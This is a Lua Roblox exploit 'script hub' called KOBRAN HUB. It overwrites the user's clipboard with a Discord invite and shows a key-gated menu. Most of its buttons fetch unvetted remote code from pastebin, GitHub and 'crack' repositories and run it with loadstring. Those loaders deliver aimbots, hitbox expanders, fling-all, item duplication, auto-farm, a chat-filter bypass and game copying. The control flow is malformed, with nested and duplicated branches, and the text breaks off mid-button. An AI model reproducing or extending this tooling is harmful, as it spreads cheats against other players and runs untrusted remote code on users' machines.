
setclipboard("https://discord.gg/uzRak7XB8F")

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
    Name = "KOBRAN HUB",
    Icon = album, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
    LoadingTitle = "KOBRAN HUB Loaded!",
    LoadingSubtitle = "By _kobran_",
    Theme = "nil", -- Check https://docs.sirius.menu/rayfield/configuration/themes
 
    DisableRayfieldPrompts = true,
    DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface
 
    ConfigurationSaving = {
       Enabled = true,
       FolderName = nil, -- Create a custom folder for your hub/game
       FileName = "KOBRAN Hub"
    },
 
    Discord = {
       Enabled = true, -- Prompt the user to join your Discord server elseif their executor supports it
       Invite = "uzRak7XB8F", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
       RememberJoins = false -- Set this to false to make them join the discord every time they load it up
    },
 
    KeySystem = true, -- Set this to true to use our key system
    KeySettings = {
       Title = "KOBRAN HUB",
       Subtitle = "KOBRAN Key System",
       Note = "Linkvertise in discord server", -- Use this to tell the user how to get a key
       FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
       SaveKey = false, -- The user's key will be saved, but if you change the key, they will be unable to use your script
       GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
       Key = {"KOBRANCHRISTMASYAY"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
    }
 })
 local Tab = Window:CreateTab("Universal", 4483362458) -- Title, Image 

 local Button = Tab:CreateButton({
    Name = "Chat Bypass",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/shadow62x/catbypass/main/upfix"))()
    end,
 })

 local Button = Tab:CreateButton({
    Name = "Aimlock hold m2 to lock on",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/W87YgsgD",true))()
    end,
 })

 local Button = Tab:CreateButton({
    Name = "Hitbox expander",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/b1TBuNtP",true))()
    end,
 })

 local Button = Tab:CreateButton({
    Name = "Inf Yield aka admin commands",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
    end,
 })
 local Button = Tab:CreateButton({
    Name = "UNC TEST",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/uuuuuuu/refs/heads/main/UNC%20test"))()
    end,
 })
 local Button = Tab:CreateButton({
    Name = "INF JUMP",
    Callback = function()
        local thing = Instance.new("Part")
        thing.Name = "This is a part of the game"
        thing.Anchored = true
        thing.Parent = game.Workspace
        thing.Size = Vector3.new(5, 0.1, 5)
        thing.Transparency = 1
        game:GetService("RunService").Stepped:connect(
        function()
        local pos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
        thing.CFrame = CFrame.new(pos.X, pos.Y-3.3,pos.Z)
        end)
    end,
 })

 local Button = Tab:CreateButton({
    Name = "TP TOOL",
    Callback = function()
        local players = game:GetService("Players")
local localPlayer = players.LocalPlayer
local backpack = localPlayer.Backpack
local mouse = localPlayer:GetMouse()

local function isAlive(Player, headCheck)
    local Player = Player or localPlayer
    if Player and Player.Character and ((Player.Character:FindFirstChildOfClass("Humanoid")) and (Player.Character:FindFirstChild("HumanoidRootPart")) and (headCheck and Player.Character:FindFirstChild("Head") or not headCheck)) then
        return true
    else
        return false
    end
end

local tool = Instance.new("Tool")
tool.Name = "TPTool"
loadstring(game:HttpGet("https://rscripts.net/raw/tp-tool-or-universal-all-executors-support_1726409972061_KYsl77ZQuH.txt",true))()
    end,
 })

 local Button = Tab:CreateButton({
    Name = "Copy game",
    Callback = function()
        saveinstance(_)
    end,
 })

 local Button = Tab:CreateButton({
    Name = "Invisible",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/yYiyt6RP",true))()
    end,
 })

 local Button = Tab:CreateButton({
    Name = "Spy",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/6sAUmxQH",true))()
    end,
 })

 local Button = Tab:CreateButton({
    Name = "Fling all",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX",true))()
    end,
 })

 local Button = Tab:CreateButton({
    Name = "Goofy Animation",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/ZEjAb738",true))()
    end,
 })

 local Button = Tab:CreateButton({
   Name = "KnifeByPasser",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/SysgetaScripts/KnifeBypasser/refs/heads/main/Freemium.lua", true))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Azura Hub",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/nikoladhima/Azura-Script-Hub/refs/heads/main/Azura-Script-Hub"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Proximity Hub Script( Updated ) ( BETA )",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/freedomattacker83/ProximityHub/refs/heads/main/loader.lua"))()
   end,
})


local Button = Tab:CreateButton({
   Name = "AI ChatBot",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/Guerric9018/chatbothub/main/ChatbotHub.lua"))
   end,
})

local Button = Tab:CreateButton({
   Name = "Fire Hub",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/redz9999999/MultiScriptsAtOnceForSolara/refs/heads/main/EveryExecuterSupport"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Universal Troll",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/unixetp/unixhub/refs/heads/main/script"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "End Hub V1",
   Callback = function()
      loadstring(game:HttpGet("https://pastebin.com/raw/s6JvnqGv"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "ProtaX",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/UniverseScript/Project-ProtaX/refs/heads/main/ProtaX"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Surival Hub V3 ",
   Callback = function()
      loadstring(game:HttpGet("https://pastebin.com/raw/b4M9zmuN"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Fps Counter Beta",
   Callback = function()
      loadstring(game:HttpGet('https://raw.githubusercontent.com/CaseohCASEOH/Gui/refs/heads/main/FPSCOUNTER'))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Fortex Universal",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/LorisHost/lzosiexw/refs/heads/main/frtxhub.lua"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "XeroHub Keyless",
   Callback = function()
      loadstring(game:HttpGet("https://pastebin.com/raw/k1aPFVCp", true))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Fly GUI",
   Callback = function()
      loadstring(Game:HttpGet("https://raw.githubusercontent.com/TheRealXORA/Roblox/refs/heads/Main/Scripts%20/Universal%20/Fly.lua", true))()
   end,
})



local gametab
 if game.GameId== 994732206 then
local gametab = Window:CreateTab("Blox Fruit", 4483362458) -- Title, Image
local Button = gametab:CreateButton({
    Name = "Perd Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/PerdHub/Blosfruitscript/main/PerdLoader"))()
    end,
 })
-- Funky Friday
elseif game.GameId== 2404080894 then
local gametab = Window:CreateTab("Funky Friday", 4483362458) -- Title, Image
local Button = gametab:CreateButton({
    Name = "Uni Hub",
    Callback = function()
        loadstring(game:HttpGet('https://pastebin.com/raw/dcyuEgyK'))()
    end,
})

-- Rivals
elseif game.GameId== 6035872082 then
local gametab = Window:CreateTab("Rivals", 4483362458) -- Title, Image
local Button = gametab:CreateButton({
    Name = "Unknown Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/cracklua/cracks/m/SilentRivals"))()
    end,
})

local Button = gametab:CreateButton({
    Name = "Silent Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/cracklua/cracks/m/SilentRivals"))()
    end,
})

-- Arsenal
elseif game.GameId== 111958650 then
local gametab = Window:CreateTab("Arsenal", 4483362458)

local Button = gametab:CreateButton({
    Name = "Tbao Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubArsenal"))()
    end,
})

local Button = gametab:CreateButton({
    Name = "QP Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/QPScript/Script/main/Arsenal.txt"))()
    end,
})

local Button = gametab:CreateButton({
    Name = "LEG HUB",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/G6Ubkkuv"))()
    end,
})

local Button = gametab:CreateButton({
    Name = "Thunder Client Light v2",
    Callback = function()
        loadstring(game:HttpGet('https://api.luarmor.net/files/v3/loaders/b95e8fecdf824e41f4a030044b055add.lua'))()
    end,
})

local Button = gametab:CreateButton({
    Name = "Stormware HUB",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/QP-Community/Roblox-Exploit/main/Stormware_Crack"))()
    end,
})

local Button = gametab:CreateButton({
    Name = "Tanqr HUB",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/mXQLj82U"))()
    end,
})

local Button = gametab:CreateButton({
    Name = "Silent Aim Gui",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/iFDUTWfp"))()
    end,
})

local Button = gametab:CreateButton({
    Name = "Quotas Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Insertl/QuotasHub/main/BETAv.0.4"))()
    end,
})

local Button = gametab:CreateButton({
    Name = "Aimbot HUB",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ttwizz/Open-Aimbot/master/source.lua", true))()
    end,
})

elseif game.GameId== 5931899687 then
local gametab = Window:CreateTab("Character RNG", 4483362458) -- Title, Image
local Button = gametab:CreateButton({
    Name = "Dora Hub",
    Callback = function()
        loadstring(game:HttpGet("https://scriptblox.com/raw/Character-RNG-FAST-SPIN-AUTO-CLAIM-NO-SPIN-ANIMATION-15030"))()
    end,
})

local Button = gametab:CreateButton({
    Name = "Ghoul Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Glibson1/-Ghoul/main/Ghoul"))()
    end,
})

elseif game.GameId== 3058628877 then
local gametab = Window:CreateTab("Pets Trending", 4483362458)
local Button = gametab:CreateButton({
    Name = "Dupe",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Farx11122/Hi/main/PetTrd"))()
    end,
})

elseif game.GameId== 372226183 then
local gametab = Window:CreateTab("Flee the Facility", 4483362458)
local Button = gametab:CreateButton({
    Name = "Yarhm Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua", false))()
    end,
})

local Button = gametab:CreateButton({
    Name = "Spimine Hub",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/antisocialb2/SPIMINE-FLEETHEFACILITY/main/script.lua'))()
    end,
})

local Button = gametab:CreateButton({
    Name = "Simp Hub",
    Callback = function()
        loadstring(game:HttpGet("https://cracklua.github.io/cracks/simp"))()
    end,
})

elseif game.GameId== 833423526 then
        local gametab = Window:CreateTab("Strucid", 4483362458)
        gametab:CreateButton({
            Name = "Strucid",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/10x00/Public-Cracks/main/Apollo%20Hub%20Crack.lua"))()
            end,
        })
    
elseif game.GameId == 1516533665 then
        local gametab = Window:CreateTab("Piggy", 4483362458)
        gametab:CreateButton({
            Name = "Piggy",
            Callback = function()
                loadstring(game:HttpGet("https://rawscripts.net/raw/Piggy-open-source-15390", true))()
            end,
        })
    
elseif game.GameId == 4348829796 then
        local gametab = Window:CreateTab("Murders Vs Sheriffs Duels", 4483362458)
        gametab:CreateButton({
            Name = "Freakbob Hub",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/BeanBotWare/FreakBob/refs/heads/main/FreakBob"))()
            end,
        })
        gametab:CreateButton({
            Name = "Auto Kill/Auto Win",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/RenceeeX/DurexHub/refs/heads/main/MurderersVsSheriffs"))()
            end,
        })
        gametab:CreateButton({
            Name = "Hitbox Expander",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/VGXMOD99/SCRIPT-/main/Murder%20vs%20Sherif%20duel.txt"))()
            end,
        })
    
elseif game.GameId == 4777817887 then
        local gametab = Window:CreateTab("Blade Ball", 4483362458)
        gametab:CreateButton({
            Name = "Allux Hub",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/iminreality/Allux/refs/heads/main/Blade_Ball.lua"))()
            end,
        })
        gametab:CreateButton({
            Name = "Lunax Hub",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/Alexisisback/Universall/refs/heads/main/Blade%20ball.lua", true))()
            end,
        })
    
elseif game.GameId == 66654135 then
        local gametab = Window:CreateTab("MM2", 4483362458)
        gametab:CreateButton({
            Name = "X Hub",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2"))()
            end,
        })
        gametab:CreateButton({
            Name = "Vertex Hub",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring"))()
            end,
        })
    
elseif game.GameId == 73885730 then
        local gametab = Window:CreateTab("Prison Life", 4483362458)
        gametab:CreateButton({
            Name = "Prizzlife Hub",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/elliexmln/PrizzLife/main/Source/release_v0.8.1.lua"))()
            end,
        })
    
elseif game.GameId == 2440500124 then
        local gametab = Window:CreateTab("Doors", 4483362458)
        gametab:CreateButton({
            Name = "MS Paint Hub",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/notpoiu/mspaint/main/main.lua"))()
            end,
        })
    
elseif game.GameId == 254394801 then
        local gametab = Window:CreateTab("KAT", 4483362458)
        gametab:CreateButton({
            Name = "Kat",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/scripter1cursed1rade/BelugaWare-1.4/main/belugaware.lua", true))()
            end,
        })
    
elseif game.GameId == 6471439544 then
        local gametab = Window:CreateTab("Rate My Avatar", 4483362458)
        gametab:CreateButton({
            Name = "RMA",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/rate-my-avatar-gui/main/main.lua", true))()
            end,
        })
    
elseif game.GameId == 1686885941 then
        local gametab = Window:CreateTab("Brookhaven", 4483362458)
        gametab:CreateButton({
            Name = "f0rtuit0us Hub",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/TrollGuiMaker/f0rtuit0us-hub/refs/heads/main/old", true))()
            end,
        })
        gametab:CreateButton({
            Name = "MoonUI v13 (Recommended)",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/IlikeyocutgHAH/MoonUI-v13-102-SCRIPTS/main/MoonUI%20v13!"))()
            end,
        })
    
elseif game.GameId == 1119466531 then
        local gametab = Window:CreateTab("Legends Of Speed", 4483362458)
        gametab:CreateButton({
            Name = "MOST OP LEGENDS OF SPEED",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/ReeAndArceus/Legends-Of-Speed-Gui/main/Gui", true))()
            end,
        })
    
    elseif game.GameId == 504035427 then
        local gametab = Window:CreateTab("Zombie Attack!", 4483362458)
        gametab:CreateButton({
            Name = "Projeto LKB Hub",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/dqtixz/Zombie-Attack-Projeto-LKB/main/Open%20Source"))()
            end,
        })
    
    elseif game.GameId == 4144991005 then
        local gametab = Window:CreateTab("Snow Plow Simulator", 4483362458)
        gametab:CreateButton({
            Name = "Linux Hub",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/wannagrindlikepablo/Linux-Hub/refs/heads/main/Linux%20Hub", true))()
            end,
        })
    
    elseif game.GameId == 3168615253 then
        local gametab = Window:CreateTab("Ability Wars", 4483362458)
        gametab:CreateButton({
            Name = "Komaru Hub (OP)",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/railme37509124/komaruhubabilitywars/main/script.lua", true))()
            end,
        })
    
    elseif game.GameId == 2139563899 then
        local gametab = Window:CreateTab("Ragdoll Engine", 4483362458)
        gametab:CreateButton({
            Name = "System Broken GUI",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script", true))()
            end,
        })
    
    elseif game.GameId == 1526814825 then
        local gametab = Window:CreateTab("War Tycoon", 4483362458)
        gametab:CreateButton({
            Name = "Neptune Hub",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/JinxTheCatto/Neptune/main/NeptuneHub.lua", true))()
            end,
        })
    
    elseif game.GameId == 2132866904 then
        local gametab = Window:CreateTab("Frontlines", 4483362458)
        gametab:CreateButton({
            Name = "Frontlines",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/Waza80/scripts-new/main/Frontlines.lua", true))()
            end,
        })
    
    elseif game.GameId == 210851291 then
        local gametab = Window:CreateTab("Build A Boat", 4483362458)
        gametab:CreateButton({
            Name = "Auto Farm",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/WeshkyB/Weshkys-Auto-Farm/refs/heads/main/WFarm/UI.lua"))()
            end,
        })
        gametab:CreateButton({
            Name = "Auto Builder",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/max2007killer/auto-build-not-limit/main/buildaboatv2obs.txt", true))()
            end,
        })

        -- Driving Empire
elseif game.GameId==1202096104 then
    local gameTab = Window:CreateTab("Driving Empire", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Driving Empire!")
 
    local Button = gameTab:CreateButton({
       Name = "sit on car first then turn on autofarm",
       Callback = function()
          loadstring(game:HttpGet("https://pastefy.app/B3bzy9h6/raw",true))()
       end, 
    })
 
    local Button = gameTab:CreateButton({
       Name = "Driving Empire",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Marco8642/science/main/drivingempire", true))()
       end, 
    })

    -- 3008
if game.GameId==1000233041 then
    local gametab = Window:CreateTab("3008", 4483362458) -- Title, Image
    local Section = gametab:CreateSection("3008")
    
    local Button = gametab:CreateButton({
       Name = "3008",
       Callback = function()
    loadstring(game:HttpGet("https://pastebin.com/raw/zgx1RgNa",true))()
       end,
    })
    
    -- da hood
elseif game.GameId==1008451066 then
    local gameTab = Window:CreateTab("Da Hood", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Da hood!")
    
    local Button = gameTab:CreateButton({
       Name = "Simplicity Hub",
       Callback = function()
       loadstring(game:HttpGet("https://cracklua.github.io/cracks/simp"))()
       end,
    })
    
    local Button = gameTab:CreateButton({
       Name = "starhook",
       Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/Dekos-lgbty/dahood/main/starhook"))()
       end,
    })
    
    local Button = gameTab:CreateButton({
       Name = "Azure Modded",
       Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/Actyrn/Scripts/main/AzureModded"))()
       end,
    })
    
    -- da hood AUTO FARM
elseif game.GameId==1008451066 then
    local gameTab = Window:CreateTab("da hood AUTO FARM", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("da hood AUTO FARM")
 
    local Button = gameTab:CreateButton({
       Name = "less lag but slow",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/GOOSEBUMPPS/voidxhub/main/dahood",true))()
       end,
    })
 
    local Button = gameTab:CreateButton({
       Name = "NO SOLARA! i think only wave",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/pixelheadx/Polakya/main/Bestscript.md"))()
       end,
    })
 
    -- Horror Rng
elseif game.GameId==6045016956 then
    local gameTab = Window:CreateTab("Horror Rng", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Horror Rng")
 
 local Button = gameTab:CreateButton({
    Name = "Inf Luck",
    Callback = function()
       while wait(0) do game:GetService("ReplicatedStorage").Events.InventoryEvent:FireServer("Equip","Super Luck Potion","Usable") end
    end,
 })
 
    
    
    -- Funky Friday
elseif game.GameId==2404080894 then
    local gameTab = Window:CreateTab("Funky Friday", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Funky Friday!")
    
    local Button = gameTab:CreateButton({
       Name = "Funky friday",
       Callback = function()
           loadstring(game:HttpGet('https://pastebin.com/raw/dcyuEgyK'))()
       end, 
    })
    
    local Button = gameTab:CreateButton({
       Name = "Funky friday",
       Callback = function()
           loadstring(game:HttpGet("https://raw.githubusercontent.com/ZoinkyPoinkie/FunkyFridayDevTools/main/Un-Obfuscated",true))()
       end, 
    })
    
    
    -- brookhaven
elseif game.GameId==1686885941 then
    local gameTab = Window:CreateTab("BrookHaven", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("BrookHaven!")
    
    local Button = gameTab:CreateButton({
       Name = "Brookhaven",
       Callback = function()
           loadstring(game:HttpGet('https://raw.githubusercontent.com/M1ZZ001/BrookhavenR4D/main/Brookhaven%20R4D%20Script'))()
       end, 
    })
    
    -- Admin Rng
elseif game.GameId==5976020326 then
    local gameTab = Window:CreateTab("Admin Rng", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Admin rng")
 
    local Button = gameTab:CreateButton({
       Name = "roll 2 times faster",
       Callback = function()
          while true do 
             local args = { [1] = true, [2] = true }
             game:GetService("ReplicatedStorage").Events.Spin:InvokeServer(unpack(args))
             task.wait(0)
           end
       end, 
    })
    
    local Button = gameTab:CreateButton({
       Name = "Dora Hub. Auto roll is slow use the first script",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/DoraScriptHub/DoraScriptHub-/main/ADMIN%20RNG"))()
       end, 
    })
    
    -- Character Rng
elseif game.GameId==5931899687 then
    local gameTab = Window:CreateTab("Character Rng", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Character Rng")
 
    local Button = gameTab:CreateButton({
       Name = "Dora Hub",
       Callback = function()
          loadstring(game:HttpGet("https://scriptblox.com/raw/Character-RNG-FAST-SPIN-AUTO-CLAIM-NO-SPIN-ANIMATION-15030"))()
       end, 
    })
 
    local Button = gameTab:CreateButton({
       Name = "Ghoul hub",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Glibson1/-Ghoul/main/Ghoul"))()
       end, 
    }) 
    
    -- Dbz Rng
elseif game.GameId==6012490639 then
    local gameTab = Window:CreateTab("Dbz Rng", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("DBZ rng!!")
 
    local Button = gameTab:CreateButton({
       Name = "Dbz Rng",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/jjp2iky/scripts/main/DBR"))()
       end, 
    })
    
    -- MM2
elseif game.GameId==66654135 then
    local gameTab = Window:CreateTab("MM2", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("MM2!")
 
    local Button = gameTab:CreateButton({
       Name = "MM2 STARRY HUB",
       Callback = function()
          loadstring(game:HttpGet("https://www.cloudbin.org/love"))()
       end, 
    })
 
    local Button = gameTab:CreateButton({
       Name = "arher hub",
       Callback = function()
          --DISCORD please join: https://discord.gg/n86w8P8Evx
 script_key = "Add key here to auto verify"
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/2529a5f9dfddd5523ca4e22f21cceffa.lua"))()
       end, 
    })
 
    local Button = gameTab:CreateButton({
       Name = "YARHM",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua", false))()
       end, 
    })
 
    -- Basketball Legends
elseif game.GameId==4931927012 then
    local gameTab = Window:CreateTab("Basketball Legends", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Basketball Legends")
 
    local Button = gameTab:CreateButton({
       Name = "Atlas Hub",
       Callback = function()
          getgenv().dontoffline = false -- put true instead of false when nothing pops up at all
 _G.AtlasHubSafeMode = false -- put true instead of false when getting detected by anticheat
 loadstring(game:HttpGet("https://cracklua.github.io/cracks/atlas"))()
       end, 
    })
 
    local Button = gameTab:CreateButton({
       Name = "Hold E On PC When Executed to auto green",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/flex2009/scripts/main/basketball"))()
       end, 
    })
    
    -- Evade
elseif game.GameId==3647333358 then
    local gameTab = Window:CreateTab("Evade", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Evade")
 
    local Button = gameTab:CreateButton({
       Name = "HAS KEY SYSTEM",
       Callback = function()
          loadstring(game:HttpGet('https://raw.githubusercontent.com/zReal-King/Evade/main/Main.lua'))()
       end, 
    })
 
    local Button = gameTab:CreateButton({
       Name = "TBAO HUB",
       Callback = function()
          loadstring(game:HttpGet('https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubEvade'))()
       end, 
    })
 
    
    -- BrainRot Quiz
elseif game.GameId==6097178219  then
    local gameTab = Window:CreateTab("BrainRot quiz", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("BrainRot Quiz")
 
    local Button = gameTab:CreateButton({
       Name = "Auto farm win & Give all guns",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/7hbl/brainrot-quiz/main/made%20by%20%40lqmc%20open%20source%20idc"))()
       end, 
    })
    
    -- Epic Mini Games
elseif game.GameId==110181652 then
    local gameTab = Window:CreateTab("Epic Mini Games", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Epic Mini Games")
    
    local Button = gameTab:CreateButton({
       Name = "Epic mini games",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/SlamminPig/rblxgames/main/Epic%20Minigames/EpicMinigamesGUI"))()
       end, 
    })
    
    local Button = gameTab:CreateButton({
       Name = "Epic mini games",
       Callback = function()
          loadstring(game:GetObjects("rbxassetid://02565551523")[1].Source)()
       end, 
    })
    
    local Button = gameTab:CreateButton({
       Name = "Epic mini games",
       Callback = function()
          loadstring(game:HttpGet("https://pastebin.com/raw/YePwz5u5", true))()
       end, 
    })
    
    -- Zombie attack
elseif game.GameId==504035427 then
    local gameTab = Window:CreateTab("Zombie attack", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Zombie attack")
 
    local Button = gameTab:CreateButton({
       Name = "voidz Hub",
       Callback = function()
          loadstring(game:HttpGet(('https://raw.githubusercontent.com/RTrade/Voidz/main/Games.lua'),true))()
       end, 
    })
 
    local Button = gameTab:CreateButton({
       Name = "Ski Hub",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Yousuck780/Zombie-attack/main/zombie", true))()
       end, 
    })
 
    local Button = gameTab:CreateButton({
       Name = "Project LKB",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/dqtixz/Zombie-Attack-Projeto-LKB/main/Open%20Source"))()
       end, 
    })
    
    -- Breaking Point
elseif game.GameId==24990767781 then
    local gameTab = Window:CreateTab("Breaking Point", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Breaking Point")
 
    local Button = gameTab:CreateButton({
       Name = "Op breaking Point script",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/dqtixz/Zombie-Attack-Projeto-LKB/main/Open%20Source"))()
       end, 
    })
 
    -- Rivals
elseif game.GameId==6035872082 then
    local gameTab = Window:CreateTab("Rivals", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Rivals")
    
    local Button = gameTab:CreateButton({
       Name = "Rivals",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Sheeshablee73/Scriptss/main/Rivals%20Latest.lua",true))()
       end, 
    })
    
    local Button = gameTab:CreateButton({
        Name = "Jhonny hub",
        Callback = function()
           loadstring(game:HttpGet("https://raw.githubusercontent.com/JonnyCheeser/script/main/hub", true))()
        end, 
     })
     
     local Button = gameTab:CreateButton({
        Name = "Silent Hub",
        Callback = function()
           loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/1cd6fc0d685d8dcae4a3c05f01182061.lua"))()
        end, 
     })
     
    -- Anime Training Rng
elseif game.GameId==6423513550 then
    local gameTab = Window:CreateTab("Anime Training Rng", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Anime Training Rng")
 
    local Button = gameTab:CreateButton({
       Name = "NUT HUB. HALLOWEEN AUTO FARM",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/01iq/me/refs/heads/main/AnimeTrainingRng.txt",true))()
       end, 
    })
 
    local Button = gameTab:CreateButton({
       Name = "BaconBoss Hub",
       Callback = function()
          loadstring(game:HttpGet(('https://pastefy.app/p6UfN5F1/raw'),true))()
       end, 
    })
    
    -- BADDIES AUTOFARM
elseif game.GameId==3990106548 then
    local gameTab = Window:CreateTab("BADDIES AUTOFARM", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("BADDIES AUTOFARM")
 
    local Button = gameTab:CreateButton({
       Name = "BADDIES ATM AUTO FARM",
       Callback = function()
          loadstring(game:HttpGet("https://pastefy.app/g5lXK0Bk/raw",true))()
       end, 
    })
    
    -- PHANTOM BALL
elseif game.GameId==4538598064 then
    local gameTab = Window:CreateTab("PHANTOM BALL", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("PHANTOM BALL")
 
    local Button = gameTab:CreateButton({
